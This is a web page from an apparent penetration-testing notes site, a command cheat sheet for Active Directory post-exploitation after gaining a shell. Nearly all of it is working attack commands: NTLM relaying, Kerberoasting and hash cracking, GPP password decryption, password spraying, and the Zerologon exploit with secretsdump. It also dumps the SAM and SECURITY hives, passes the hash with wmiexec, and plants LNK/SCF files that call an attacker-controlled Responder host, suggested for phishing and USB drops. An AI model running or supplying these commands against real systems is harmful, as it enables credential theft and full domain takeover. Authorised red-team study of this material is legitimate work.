<!DOCTYPE html>
<html lang="en">
<head>
  
  
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    
    <meta name="author" content="readloud">
    
    <link rel="shortcut icon" href="../../../../img/favicon.ico">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" />
    <title>Basics on what to do upon getting shell/RCE - readloud.org</title>
    <link href="../../../../css/bootstrap-3.3.7.min.css" rel="stylesheet">
    <link href="../../../../css/font-awesome-4.7.0.css" rel="stylesheet">
    <link href="../../../../css/base.css" rel="stylesheet">
    <link rel="stylesheet" href="../../../../css/highlight.css">
    <!-- HTML5 shim and Respond.js IE8 support of HTML5 elements and media queries -->
    <!--[if lt IE 9]>
        <script src="https://oss.maxcdn.com/libs/html5shiv/3.7.0/html5shiv.js"></script>
        <script src="https://oss.maxcdn.com/libs/respond.js/1.3.0/respond.min.js"></script>
    <![endif]-->

    <script src="../../../../js/jquery-3.2.1.min.js"></script>
    <script src="../../../../js/bootstrap-3.3.7.min.js"></script>
    <script src="../../../../js/highlight.pack.js"></script>
    
    <base target="_top">
    <script>
      var base_url = '../../../..';
      var is_top_frame = false;
        
        var pageToc = [
          {title: "Basics on what to do upon getting shell/RCE", url: "#_top", children: [
              {title: "Just basic stuff", url: "#just-basic-stuff" },
              {title: "NLTest[^1]", url: "#nltest1" },
              {title: "Powershell Enumeration[^1]", url: "#powershell-enumeration1" },
              {title: "Dumping credentials", url: "#dumping-credentials" },
              {title: "Bloodhound (Sharphound)[^2]", url: "#bloodhound-sharphound2" },
              {title: "Runas", url: "#runas" },
              {title: "Bloodhound attacks", url: "#bloodhound-attacks" },
              {title: "Kerberoasting", url: "#kerberoasting" },
              {title: "Gathering Windows GPP passwords[^8]", url: "#gathering-windows-gpp-passwords8" },
              {title: "Pivoting", url: "#pivoting" },
          ]},
        ];

    </script>
    <script src="../../../../js/base.js"></script>
      <script src="../../../../search/main.js"></script> 
</head>

<body>
<script>
if (is_top_frame) { $('body').addClass('wm-top-page'); }
</script>



<div class="container-fluid wm-page-content">
  <a name="_top"></a>
    

    

    <h1 id="basics-on-what-to-do-upon-getting-shellrce">Basics on what to do upon getting shell/RCE</h1>
<p><strong>Note:</strong> Try as much as possible to <a href="https://lolbas-project.github.io/">Live off the land</a></p>
<ul>
<li>Good blogs for these:</li>
<li><a href="https://www.blackhillsinfosec.com/finding-buried-treasure-in-server-message-block-smb/">BHIS - Finding Buried Treasure SMB</a></li>
</ul>
<p>Also keep these vulnerabilities that <a href="https://github.com/cfalta/MicrosoftWontFixList">Microsoft Won't Fix</a> in mind when performing domain enumeration.</p>
<hr />
<h3 id="just-basic-stuff">Just basic stuff</h3>
<div class="language-text highlight"><pre><span></span><code><span id="__span-0-1"><a id="__codelineno-0-1" name="__codelineno-0-1" href="#__codelineno-0-1"></a>whoami /all
</span><span id="__span-0-2"><a id="__codelineno-0-2" name="__codelineno-0-2" href="#__codelineno-0-2"></a>hostname
</span><span id="__span-0-3"><a id="__codelineno-0-3" name="__codelineno-0-3" href="#__codelineno-0-3"></a>ipconfig /all
</span><span id="__span-0-4"><a id="__codelineno-0-4" name="__codelineno-0-4" href="#__codelineno-0-4"></a>systeminfo
</span><span id="__span-0-5"><a id="__codelineno-0-5" name="__codelineno-0-5" href="#__codelineno-0-5"></a>query user
</span><span id="__span-0-6"><a id="__codelineno-0-6" name="__codelineno-0-6" href="#__codelineno-0-6"></a>qwinsta
</span><span id="__span-0-7"><a id="__codelineno-0-7" name="__codelineno-0-7" href="#__codelineno-0-7"></a>gpresult /R 
</span><span id="__span-0-8"><a id="__codelineno-0-8" name="__codelineno-0-8" href="#__codelineno-0-8"></a>dir
</span><span id="__span-0-9"><a id="__codelineno-0-9" name="__codelineno-0-9" href="#__codelineno-0-9"></a>tree /f /a
</span><span id="__span-0-10"><a id="__codelineno-0-10" name="__codelineno-0-10" href="#__codelineno-0-10"></a>tasklist /V
</span><span id="__span-0-11"><a id="__codelineno-0-11" name="__codelineno-0-11" href="#__codelineno-0-11"></a>net user
</span><span id="__span-0-12"><a id="__codelineno-0-12" name="__codelineno-0-12" href="#__codelineno-0-12"></a>net user /domain
</span><span id="__span-0-13"><a id="__codelineno-0-13" name="__codelineno-0-13" href="#__codelineno-0-13"></a>net user &lt;username&gt;
</span><span id="__span-0-14"><a id="__codelineno-0-14" name="__codelineno-0-14" href="#__codelineno-0-14"></a>net user &lt;username&gt; /domain
</span><span id="__span-0-15"><a id="__codelineno-0-15" name="__codelineno-0-15" href="#__codelineno-0-15"></a>net localgroup
</span><span id="__span-0-16"><a id="__codelineno-0-16" name="__codelineno-0-16" href="#__codelineno-0-16"></a>net localgroup administrators
</span><span id="__span-0-17"><a id="__codelineno-0-17" name="__codelineno-0-17" href="#__codelineno-0-17"></a>net groups /domain
</span><span id="__span-0-18"><a id="__codelineno-0-18" name="__codelineno-0-18" href="#__codelineno-0-18"></a>net group &quot;&lt;group&gt;&quot; /domain
</span><span id="__span-0-19"><a id="__codelineno-0-19" name="__codelineno-0-19" href="#__codelineno-0-19"></a>net group &quot;domain admins&quot; /domain
</span><span id="__span-0-20"><a id="__codelineno-0-20" name="__codelineno-0-20" href="#__codelineno-0-20"></a>klist
</span></code></pre></div>
<hr />
<h3 id="nltest1">NLTest[^1]</h3>
<div class="language-text highlight"><pre><span></span><code><span id="__span-1-1"><a id="__codelineno-1-1" name="__codelineno-1-1" href="#__codelineno-1-1"></a>nltest /dclist:&lt;domain&gt;
</span><span id="__span-1-2"><a id="__codelineno-1-2" name="__codelineno-1-2" href="#__codelineno-1-2"></a>nltest /dsgetdc:&lt;domain&gt;
</span><span id="__span-1-3"><a id="__codelineno-1-3" name="__codelineno-1-3" href="#__codelineno-1-3"></a>nltest /domain_trusts /all_trusts
</span></code></pre></div>
<hr />
<h3 id="powershell-enumeration1">Powershell Enumeration[^1]</h3>
<div class="language-text highlight"><pre><span></span><code><span id="__span-2-1"><a id="__codelineno-2-1" name="__codelineno-2-1" href="#__codelineno-2-1"></a>[System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()
</span><span id="__span-2-2"><a id="__codelineno-2-2" name="__codelineno-2-2" href="#__codelineno-2-2"></a>([System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()).GetAllTrustRelationships()
</span><span id="__span-2-3"><a id="__codelineno-2-3" name="__codelineno-2-3" href="#__codelineno-2-3"></a>[System.DirectoryServices.ActiveDirectory.Forest]::GetCurrentForest()
</span><span id="__span-2-4"><a id="__codelineno-2-4" name="__codelineno-2-4" href="#__codelineno-2-4"></a>([System.DirectoryServices.ActiveDirectory.Forest]::GetForest((New-Object System.DirectoryServices.ActiveDirectory.DirectoryContext(&#39;Forest&#39;, &#39;&lt;domain&gt;&#39;)))).GetAllTrustRelationships()
</span></code></pre></div>
<ul>
<li>Tools for automating enumeration</li>
<li><a href="https://github.com/GhostPack/Seatbelt">Seatbelt</a></li>
<li>Bloodhound (Below)</li>
<li>Local Privilege Escalation</li>
<li><a href="https://github.com/carlospolop/PEASS-ng/tree/master/winPEAS">WinPEAS</a></li>
</ul>
<hr />
<h3 id="dumping-credentials"><a href="./Post_Exploitation#dumping-credentials1">Dumping credentials</a></h3>
<hr />
<h3 id="bloodhound-sharphound2">Bloodhound (Sharphound)[^2]</h3>
<ol>
<li>On local machine  (~Kali)</li>
<li>Bloodhound Installation[^19]</li>
<li>
<p>Running bloodhound ingestor from linux:
<div class="language-text highlight"><pre><span></span><code><span id="__span-3-1"><a id="__codelineno-3-1" name="__codelineno-3-1" href="#__codelineno-3-1"></a>cd /opt
</span><span id="__span-3-2"><a id="__codelineno-3-2" name="__codelineno-3-2" href="#__codelineno-3-2"></a>git clone https://github.com/fox-it/BloodHound.py
</span><span id="__span-3-3"><a id="__codelineno-3-3" name="__codelineno-3-3" href="#__codelineno-3-3"></a>cd BloodHound.py
</span><span id="__span-3-4"><a id="__codelineno-3-4" name="__codelineno-3-4" href="#__codelineno-3-4"></a>sudo docker run -v ${PWD}:/bloodhound-data -it bloodhound
</span><span id="__span-3-5"><a id="__codelineno-3-5" name="__codelineno-3-5" href="#__codelineno-3-5"></a># bloodhound-python -d domain.local -u user01 -p P@ssw0rd -c all,loggedon --zip
</span></code></pre></div></p>
</li>
<li>
<p>Sharphound Officialy supported ingestors [^3][^4]</p>
<ul>
<li>Running the official/supported Sharphound Collectors collects more information</li>
<li>although Bloodhound.py is quick and good for most cases</li>
<li>Running on the victim host</li>
</ul>
</li>
</ol>
<div class="language-text highlight"><pre><span></span><code><span id="__span-4-1"><a id="__codelineno-4-1" name="__codelineno-4-1" href="#__codelineno-4-1"></a>        .\SharpHound.exe -c all --encryptzip --nosavecache --zipfilename bh.zip -d domain.local
</span></code></pre></div>
<h3 id="runas">Runas</h3>
<ul>
<li>If logged in on a local user account but have domain user credentials, then on the command-line</li>
<li>This works also to get SharpHound to work and ingest data even if your own Windows VM is not part of the Domain.</li>
<li>This bypasses the need to run SharpHound on the host itself with AVs/ERDs</li>
</ul>
<div class="language-text highlight"><pre><span></span><code><span id="__span-5-1"><a id="__codelineno-5-1" name="__codelineno-5-1" href="#__codelineno-5-1"></a>        C:\&gt; runas /netonly /user:&lt;DOMAIN&gt;\&lt;username&gt; &quot;powershell.exe -exec bypass&quot;
</span><span id="__span-5-2"><a id="__codelineno-5-2" name="__codelineno-5-2" href="#__codelineno-5-2"></a>
</span><span id="__span-5-3"><a id="__codelineno-5-3" name="__codelineno-5-3" href="#__codelineno-5-3"></a>        # then on the spawned powershell
</span><span id="__span-5-4"><a id="__codelineno-5-4" name="__codelineno-5-4" href="#__codelineno-5-4"></a>        .\SharpHound.exe -c all --nosavecache --zipfilename bh.zip -d domain.local
</span></code></pre></div>
<ul>
<li>Run after sharphound for some nice statistics</li>
<li><a href="https://github.com/kaluche/bloodhound-quickwin">Bloodhound Quickwin</a>   </li>
<li>Mass import owned users in Bloodhound[^14]</li>
<li>Sample format of text file to import
    <div class="language-text highlight"><pre><span></span><code><span id="__span-6-1"><a id="__codelineno-6-1" name="__codelineno-6-1" href="#__codelineno-6-1"></a>        bob@acme.local
</span><span id="__span-6-2"><a id="__codelineno-6-2" name="__codelineno-6-2" href="#__codelineno-6-2"></a>        alice@acme.local
</span><span id="__span-6-3"><a id="__codelineno-6-3" name="__codelineno-6-3" href="#__codelineno-6-3"></a>        accounting@acme.local
</span><span id="__span-6-4"><a id="__codelineno-6-4" name="__codelineno-6-4" href="#__codelineno-6-4"></a>        trainee3@acme.local
</span></code></pre></div></li>
<li>Command. Make sure bloodhound (&amp; neo4j) is already running and credentials are correct:
    <div class="language-text highlight"><pre><span></span><code><span id="__span-7-1"><a id="__codelineno-7-1" name="__codelineno-7-1" href="#__codelineno-7-1"></a>        python3 max.py -u neo4j -p neo4j mark-owned -f ~/Results/Dump/owned_users.txt --add-note &quot;from secretsdump and weak passwords&quot;
</span></code></pre></div></li>
<li>Bloodhound Custom Queries</li>
<li>Try to make use of custom queries such as from these curious people</li>
<li><a href="https://github.com/CompassSecurity/BloodHoundQueries/blob/master/customqueries.json">Compass Security</a></li>
<li><a href="https://github.com/hausec/Bloodhound-Custom-Queries/blob/master/customqueries.json">Hausec</a></li>
</ul>
<h3 id="bloodhound-attacks">Bloodhound attacks</h3>
<ul>
<li>GenericAll [^15]</li>
<li>Although the commands in the reference work, I found that it was easier to modify permissions and other actions (reset user password) using RSAT.</li>
<li>If you're Windows attacking VM is connected to the network, just <a href="/windows/initial_foothold#rsat">run mmc as a domain user</a> (provided you already have the domain user's credentials). </li>
</ul>
<hr />
<ul>
<li>NTLM Relaying</li>
<li>Basic NTLM Relay</li>
<li>Gather NTLM Relay list using crackmapexec
 <code>crackmapexec smb --gen-relay-list relay_list.txt company_internal_subnets.txt</code>
<div class="language-text highlight"><pre><span></span><code><span id="__span-8-1"><a id="__codelineno-8-1" name="__codelineno-8-1" href="#__codelineno-8-1"></a>sudo impacket-ntlmrelayx -socks -smb2support -of output.txt -tf ./relay_list.txt -c ipconfig
</span><span id="__span-8-2"><a id="__codelineno-8-2" name="__codelineno-8-2" href="#__codelineno-8-2"></a>sudo responder -I eth1 -Pvd
</span></code></pre></div></li>
</ul>
<hr />
<ul>
<li>General Attack methods</li>
<li>Methods [^5][^6]</li>
<li>NTLM Relay[^18]</li>
<li>Golden Ticket</li>
<li>Requires full domain compromise.</li>
<li>Used for persistenceand pivoting</li>
<li>Kerberoasting</li>
<li>Requires access as any user. </li>
<li>Use to escalateand pivot</li>
<li>Silver Ticket</li>
<li>Requires service hash.</li>
<li>Use for persistenceand escalation</li>
<li>Pass-the-Ticket</li>
<li>Requires access as user.</li>
<li>Use to pivot</li>
<li>Over-Pass-the-Hash</li>
<li>Requires access as user.</li>
<li>Use to pivot</li>
</ul>
<hr />
<h3 id="kerberoasting">Kerberoasting</h3>
<ol>
<li>From Linux [^1][^7]</li>
<li>
<p>Beware of time difference of the attacking machine (Kali) and the targeted Domain Controller
<div class="language-text highlight"><pre><span></span><code><span id="__span-9-1"><a id="__codelineno-9-1" name="__codelineno-9-1" href="#__codelineno-9-1"></a>    GetUserSPNs.py -debug -request -outputfile TGS_file.txt -dc-ip &lt;DC_IP_Address&gt; &lt;FQDN&gt;/&lt;username&gt;
</span></code></pre></div></p>
</li>
<li>
<p>From Windows</p>
</li>
<li><a href="https://powersploit.readthedocs.io/en/latest/Recon/Invoke-Kerberoast/">PowerSploit</a>
<div class="language-text highlight"><pre><span></span><code><span id="__span-10-1"><a id="__codelineno-10-1" name="__codelineno-10-1" href="#__codelineno-10-1"></a>   Invoke-Kerberoast -Domain domain.com -OutputFormat hashcat
</span></code></pre></div></li>
<li>Getting SPN ticekts of from an external external forest</li>
<li>Works if there is trust towards the domain you are in
<div class="language-text highlight"><pre><span></span><code><span id="__span-11-1"><a id="__codelineno-11-1" name="__codelineno-11-1" href="#__codelineno-11-1"></a>   Get-DomainSPNTicket &lt;SERVICE&gt;/DC01.domain-external.com@domain-external.com
</span></code></pre></div></li>
</ol>
<p><a href="../Password_Cracking/Hashcat_general_cheatsheet">Password Cracking</a></p>
<ul>
<li>Refer to <a href="https://m0chan.github.io/2019/07/31/How-To-Attack-Kerberos-101">m0chan's blog</a></li>
</ul>
<div class="language-text highlight"><pre><span></span><code><span id="__span-12-1"><a id="__codelineno-12-1" name="__codelineno-12-1" href="#__codelineno-12-1"></a>    hashcat64.exe -a 3 -m 13100 SPN.hash /wordlists/rockyou.txt
</span></code></pre></div>
<hr />
<h2 id="gathering-windows-gpp-passwords8">Gathering Windows GPP passwords[^8]</h2>
<ol>
<li>On target machine logged-on with a regular domain account
<div class="language-text highlight"><pre><span></span><code><span id="__span-13-1"><a id="__codelineno-13-1" name="__codelineno-13-1" href="#__codelineno-13-1"></a>    findstr /S cpassword \\&lt;domain_controller&gt;\sysvol\*.xml
</span></code></pre></div></li>
<li>On local machine (~Kali)
<div class="language-text highlight"><pre><span></span><code><span id="__span-14-1"><a id="__codelineno-14-1" name="__codelineno-14-1" href="#__codelineno-14-1"></a>    gpp-decrypt &lt;cpassword_value&gt;
</span></code></pre></div></li>
</ol>
<hr />
<h3 id="adfind9">ADFind[^9]</h3>
<div class="language-text highlight"><pre><span></span><code><span id="__span-15-1"><a id="__codelineno-15-1" name="__codelineno-15-1" href="#__codelineno-15-1"></a>adfind.exe -f objectclass=trusteddomain
</span><span id="__span-15-2"><a id="__codelineno-15-2" name="__codelineno-15-2" href="#__codelineno-15-2"></a>adfind.exe -sc trustdmp
</span></code></pre></div>
<hr />
<h3 id="adrecon10">ADRecon[^10]</h3>
<div class="language-text highlight"><pre><span></span><code><span id="__span-16-1"><a id="__codelineno-16-1" name="__codelineno-16-1" href="#__codelineno-16-1"></a># On your own Windows VM after &quot;runas&quot; command
</span><span id="__span-16-2"><a id="__codelineno-16-2" name="__codelineno-16-2" href="#__codelineno-16-2"></a>.\ADRecon.ps1 -Method LDAP -DomainControler dc01.acme.local -Credential ACME\user01
</span></code></pre></div>
<hr />
<h3 id="rsat">RSAT</h3>
<h3 id="run-rsat-from-a-non-domain-joined-pc">Run RSAT from a non-domain joined PC</h3>
<div class="language-text highlight"><pre><span></span><code><span id="__span-17-1"><a id="__codelineno-17-1" name="__codelineno-17-1" href="#__codelineno-17-1"></a>runas /netonly /user:&lt;DOMAIN&gt;\&lt;username&gt; &quot;mmc /server=&lt;DC or domain&gt;&quot;
</span><span id="__span-17-2"><a id="__codelineno-17-2" name="__codelineno-17-2" href="#__codelineno-17-2"></a>runas /netonly /user:ACME\bob.normal.user &quot;mmc /server=dc01.acme.local&quot;
</span></code></pre></div>
<hr />
<h3 id="domain-password-spraying">Domain Password Spraying</h3>
<h3 id="dafthacks-domainpasswordspray11">Dafthack's DomainPasswordSpray[^11]</h3>
<ul>
<li>Retrieves the list of domain users, sprays and attempts to detect lockout threshold of a user and stops spraying</li>
</ul>
<div class="language-text highlight"><pre><span></span><code><span id="__span-18-1"><a id="__codelineno-18-1" name="__codelineno-18-1" href="#__codelineno-18-1"></a>Import-Module .\DomainPasswordSpray.ps1
</span><span id="__span-18-2"><a id="__codelineno-18-2" name="__codelineno-18-2" href="#__codelineno-18-2"></a>Invoke-DomainPasswordSpray -Password Spring2017
</span></code></pre></div>
<hr />
<h3 id="find-interesting-domain-share-files12">Find interesting Domain Share Files[^12]</h3>
<ul>
<li>Find-InterestingDomainShareFile
<div class="language-text highlight"><pre><span></span><code><span id="__span-19-1"><a id="__codelineno-19-1" name="__codelineno-19-1" href="#__codelineno-19-1"></a>    Find-InterestingDomainShareFile
</span></code></pre></div></li>
</ul>
<h3 id="snaffler">Snaffler</h3>
<div class="language-text highlight"><pre><span></span><code><span id="__span-20-1"><a id="__codelineno-20-1" name="__codelineno-20-1" href="#__codelineno-20-1"></a>    runas /netonly /user:domain.local\victim01 cmd.exe
</span><span id="__span-20-2"><a id="__codelineno-20-2" name="__codelineno-20-2" href="#__codelineno-20-2"></a>    snaffler.exe -s -o snaffler_.log
</span></code></pre></div>
<h3 id="crackmapexec">Crackmapexec</h3>
<ul>
<li>Also refer to <a href="./Post_Exploitation#looking-for-files-in-the-domain">this</a>
<div class="language-text highlight"><pre><span></span><code><span id="__span-21-1"><a id="__codelineno-21-1" name="__codelineno-21-1" href="#__codelineno-21-1"></a>    crackmapexec smb -d domain.local -u victim01 -p P@ssw0rd -M spider_plus
</span></code></pre></div></li>
</ul>
<hr />
<h3 id="direct-attacks-to-the-domain-controller">Direct Attacks to the Domain Controller</h3>
<h3 id="zerologon-1617">Zerologon [^16][^17]</h3>
<ul>
<li>Resets machine account of vulnerable domain controller</li>
<li>Remember to restore the password after</li>
</ul>
<div class="language-text highlight"><pre><span></span><code><span id="__span-22-1"><a id="__codelineno-22-1" name="__codelineno-22-1" href="#__codelineno-22-1"></a>python3 zerologon_tester.py dc02 10.10.10.20 # From securaBV
</span><span id="__span-22-2"><a id="__codelineno-22-2" name="__codelineno-22-2" href="#__codelineno-22-2"></a>
</span><span id="__span-22-3"><a id="__codelineno-22-3" name="__codelineno-22-3" href="#__codelineno-22-3"></a>python3 cve-2020-1472-exploit.py dc02 10.10.10.20 # From dirkjanm
</span><span id="__span-22-4"><a id="__codelineno-22-4" name="__codelineno-22-4" href="#__codelineno-22-4"></a>
</span><span id="__span-22-5"><a id="__codelineno-22-5" name="__codelineno-22-5" href="#__codelineno-22-5"></a>secretsdump.py -no-pass -just-dc acme.local/dc02\$@10.10.10.20 # From impacket
</span></code></pre></div>
<h3 id="password-restoration-process">Password restoration process</h3>
<div class="language-text highlight"><pre><span></span><code><span id="__span-23-1"><a id="__codelineno-23-1" name="__codelineno-23-1" href="#__codelineno-23-1"></a>wmiexec.py -hashes aad3b435b51404eeaad3b435b51404ee:2b576acbe6bcfda7294d6bd18041b8fe acme.local/administrator@10.10.10.20
</span><span id="__span-23-2"><a id="__codelineno-23-2" name="__codelineno-23-2" href="#__codelineno-23-2"></a>cd Windows/temp
</span><span id="__span-23-3"><a id="__codelineno-23-3" name="__codelineno-23-3" href="#__codelineno-23-3"></a>reg save HKLM\SYSTEM system.save
</span><span id="__span-23-4"><a id="__codelineno-23-4" name="__codelineno-23-4" href="#__codelineno-23-4"></a>reg save HKLM\SAM sam.save
</span><span id="__span-23-5"><a id="__codelineno-23-5" name="__codelineno-23-5" href="#__codelineno-23-5"></a>reg save HKLM\SECURITY security.save
</span><span id="__span-23-6"><a id="__codelineno-23-6" name="__codelineno-23-6" href="#__codelineno-23-6"></a>
</span><span id="__span-23-7"><a id="__codelineno-23-7" name="__codelineno-23-7" href="#__codelineno-23-7"></a>smbclient \\\\10.10.10.20\\c$ -U &#39;acme.local\\administrator%2b576acbe6bcfda7294d6bd18041b8fe&#39; --pw-nt-hash
</span><span id="__span-23-8"><a id="__codelineno-23-8" name="__codelineno-23-8" href="#__codelineno-23-8"></a>cd Windows/temp
</span><span id="__span-23-9"><a id="__codelineno-23-9" name="__codelineno-23-9" href="#__codelineno-23-9"></a>get system.save
</span><span id="__span-23-10"><a id="__codelineno-23-10" name="__codelineno-23-10" href="#__codelineno-23-10"></a>get security.save
</span><span id="__span-23-11"><a id="__codelineno-23-11" name="__codelineno-23-11" href="#__codelineno-23-11"></a>get sam.save
</span><span id="__span-23-12"><a id="__codelineno-23-12" name="__codelineno-23-12" href="#__codelineno-23-12"></a>
</span><span id="__span-23-13"><a id="__codelineno-23-13" name="__codelineno-23-13" href="#__codelineno-23-13"></a>
</span><span id="__span-23-14"><a id="__codelineno-23-14" name="__codelineno-23-14" href="#__codelineno-23-14"></a>wmiexec.py -hashes aad3b435b51404eeaad3b435b51404ee:2b576acbe6bcfda7294d6bd18041b8fe acme.local/administrator@10.10.10.20
</span><span id="__span-23-15"><a id="__codelineno-23-15" name="__codelineno-23-15" href="#__codelineno-23-15"></a>cd Windows/temp
</span><span id="__span-23-16"><a id="__codelineno-23-16" name="__codelineno-23-16" href="#__codelineno-23-16"></a>del system.save
</span><span id="__span-23-17"><a id="__codelineno-23-17" name="__codelineno-23-17" href="#__codelineno-23-17"></a>del security.save
</span><span id="__span-23-18"><a id="__codelineno-23-18" name="__codelineno-23-18" href="#__codelineno-23-18"></a>del sam.save
</span><span id="__span-23-19"><a id="__codelineno-23-19" name="__codelineno-23-19" href="#__codelineno-23-19"></a>
</span><span id="__span-23-20"><a id="__codelineno-23-20" name="__codelineno-23-20" href="#__codelineno-23-20"></a>
</span><span id="__span-23-21"><a id="__codelineno-23-21" name="__codelineno-23-21" href="#__codelineno-23-21"></a>secretsdump.py -sam sam.save -system system.save -security security.save local
</span><span id="__span-23-22"><a id="__codelineno-23-22" name="__codelineno-23-22" href="#__codelineno-23-22"></a>
</span><span id="__span-23-23"><a id="__codelineno-23-23" name="__codelineno-23-23" href="#__codelineno-23-23"></a>python3 restorepassword.py acme.local/dc02@dc02 -target-ip 10.10.10.20  -hexpass ef464f4194d9f401af41c9982dc7c85524cc9ed8adef4fe24c8044d13f1ae41c594131d2d46cab3a0d3384cda94baae65d5a87d26df1201ff6ff1697672ac4e16c16f0e514f6e54d84342c5af4193fe96329e3a30fb84c08845e7a289749225276c7c2e3181555fa5eef21d4d1ba23aba0f4706383327b299283f72b7df6b661cfb11189bd8b3ab552ffb99aa12ffe19b760e00e143ef3e776d8377da57925c5ed71aa9f0991acff7fc9c963addb8496fdd273f231e15a51d99f41a770de714573b26795c45a03eac80e3bb45ac5c100740da5814c3979e5349e8471623086c80f6160163f4bd56da3b75a6deb17b1020 # From dirkjanm
</span><span id="__span-23-24"><a id="__codelineno-23-24" name="__codelineno-23-24" href="#__codelineno-23-24"></a>
</span><span id="__span-23-25"><a id="__codelineno-23-25" name="__codelineno-23-25" href="#__codelineno-23-25"></a>secretsdump.py -no-pass -just-dc acme.local/dc02\$@10.10.10.20
</span></code></pre></div>
<hr />
<h2 id="pivoting">Pivoting</h2>
<h3 id="executing-commands-remotely">Executing Commands Remotely</h3>
<h3 id="psexec">PsExec</h3>
<h3 id="powershell-remote-session-psremote">Powershell Remote Session (PSRemote)</h3>
<ul>
<li>"Usual" requirement is that you must be in the same subnet as the machine you are connecting to</li>
<li>Create a session</li>
<li>Without specified credentials
<div class="language-text highlight"><pre><span></span><code><span id="__span-24-1"><a id="__codelineno-24-1" name="__codelineno-24-1" href="#__codelineno-24-1"></a>        New-PSSession dc01.domain.com
</span><span id="__span-24-2"><a id="__codelineno-24-2" name="__codelineno-24-2" href="#__codelineno-24-2"></a>        $s = New-PSSession dc01.domain.com
</span></code></pre></div></li>
<li>Create a session with credentials
<div class="language-text highlight"><pre><span></span><code><span id="__span-25-1"><a id="__codelineno-25-1" name="__codelineno-25-1" href="#__codelineno-25-1"></a>        $cred = get-credential
</span><span id="__span-25-2"><a id="__codelineno-25-2" name="__codelineno-25-2" href="#__codelineno-25-2"></a>        New-PSSession dc01.domain.com –Credential $cred
</span></code></pre></div></li>
<li>Run commands remotely via PSSession
<div class="language-text highlight"><pre><span></span><code><span id="__span-26-1"><a id="__codelineno-26-1" name="__codelineno-26-1" href="#__codelineno-26-1"></a>    Invoke-Command -Session $s -FilePath C:\Temp\Rubeus.ps1
</span></code></pre></div></li>
<li>Interactive PSSession
<div class="language-text highlight"><pre><span></span><code><span id="__span-27-1"><a id="__codelineno-27-1" name="__codelineno-27-1" href="#__codelineno-27-1"></a>    Enter-PSSession -Id &lt;#&gt;
</span></code></pre></div></li>
<li>Exit PSSession
<div class="language-text highlight"><pre><span></span><code><span id="__span-28-1"><a id="__codelineno-28-1" name="__codelineno-28-1" href="#__codelineno-28-1"></a>    Remove-PSSession -Id &lt;#&gt;
</span></code></pre></div></li>
</ul>
<h3 id="windows-remote-management">Windows Remote Management</h3>
<div class="language-text highlight"><pre><span></span><code><span id="__span-29-1"><a id="__codelineno-29-1" name="__codelineno-29-1" href="#__codelineno-29-1"></a>winrs -r:DC01.domain.com cmd
</span></code></pre></div>
<h3 id="wmic">WMIC</h3>
<ul>
<li>Run a DLL file remotely using <code>wmic</code> via <code>installutil</code>[^15]
<div class="language-text highlight"><pre><span></span><code><span id="__span-30-1"><a id="__codelineno-30-1" name="__codelineno-30-1" href="#__codelineno-30-1"></a>    wmic /node:dc01.domain.com process call create &quot;cmd.exe /c \windows\microsoft.net\framework64\v4.0.30319\installutil.exe /logfile= /u \temp\file.dll&quot;
</span></code></pre></div>
** Creating lnk file in writable shares</li>
<li>None opsec safe</li>
<li>In my experience, IT noticed randomly generated folder names (not necessarily a file)</li>
<li>Still good to be inserted in phishing email attachments and USB drops (combine with knary)
<div class="language-text highlight"><pre><span></span><code><span id="__span-31-1"><a id="__codelineno-31-1" name="__codelineno-31-1" href="#__codelineno-31-1"></a>crackmapexec smb /home/kali/Scope/writable_shares.txt -d domain.local -u user01 -p P@ssw0rd -M slinky -o SERVER=&lt;ATTACKER_RESPONDER_IP&gt; NAME=Microsoft_UpdateLnk
</span><span id="__span-31-2"><a id="__codelineno-31-2" name="__codelineno-31-2" href="#__codelineno-31-2"></a>crackmapexec smb /home/kali/Scope/writable_shares.txt -d domain.local -u user01 -p P@ssw0rd -M scuffy -o SERVER=&lt;ATTACKER_RESPONDER_IP&gt; NAME=Microsoft_UpdateScf
</span></code></pre></div></li>
</ul>
<p>~ [^1]: <a href="https://www.ired.team/offensive-security-experiments/offensive-security-cheetsheets">ired.team</a>
~ [^2]: <a href="https://hausec.com/2019/03/12/penetration-testing-active-directory-part-ii/">hausec</a>
~ [^3]: <a href="https://github.com/BloodHoundAD/BloodHound/tree/master/Collectors">Github - Bloodhound</a>
~ [^4]: <a href="https://bloodhound.readthedocs.io/en/latest/data-collection/sharphound">ReadTheDocs - Bloodhound</a>
~ [^5]: <a href="https://www.redsiege.com/wp-content/uploads/2020/04/20200430-kerb101.pdf">Red Siege</a>
~ [^6]: <a href="https://raw.githubusercontent.com/Orange-Cyberdefense/arsenal/master/mindmap/pentest_ad.png">Orange Cyberdefense</a>
~ [^7]: <a href="https://gist.github.com/TarlogicSecurity/2f221924fef8c14a1d8e29f3cb5c5c4a">Tarlogic Security</a>
~ [^8]: <a href="https://pure.security/dumping-windows-credentials/">Pure Security</a>
~ [^9]: <a href="https://redcanary.com/threat-detection-report/techniques/domain-trust-discovery/">Redcanary</a>
~ [^10]: <a href="https://github.com/adrecon/ADRecon">Github - ADRecon</a>
~ [^11]: <a href="https://github.com/dafthack/DomainPasswordSpray">Guthub - DomainPasswordSpray</a>
~ [^12]: <a href="https://powersploit.readthedocs.io/en/latest/Recon/Find-InterestingDomainShareFile/">Readthedocs - Powersploit</a>
~ [^13]: <a href="https://www.youtube.com/watch?v=wTmQ5FaRmf4">Move Aside Script Kiddies–Malware Execution in the Age of Advanced Defenses | Joff Thyer</a>
~ [^14]: <a href="https://github.com/knavesec/Max">Github - Knavesec - Max</a>
~ [^15]: <a href="https://bloodhound.readthedocs.io/en/latest/data-analysis/edges#genericall">Bloodhound - GenericAll</a>
~ [^16]: <a href="https://github.com/SecuraBV/CVE-2020-1472">Github -  SecuraBV/CVE-2020-1472</a>
~ [^17]: <a href="https://github.com/dirkjanm/CVE-2020-1472">Github - dirkjanm/CVE-2020-1472</a>
~ [^18]: <a href="https://www.trustedsec.com/blog/a-comprehensive-guide-on-relaying-anno-2022/">TrustedSec - Comprehensive Guide on NTLM Relaying 2022</a>
~ [^19]: <a href="https://bloodhound.readthedocs.io/en/latest/installation/linux">Readthedocs - Bloodhound</a>
~ [^20]: <a href="https://twitter.com/mpgn_x64/status/1508781519430692864">Twitter - mpgn</a></p>

  <br>
    

    <br>
</div>

<footer class="col-md-12 wm-page-content">
      <p>
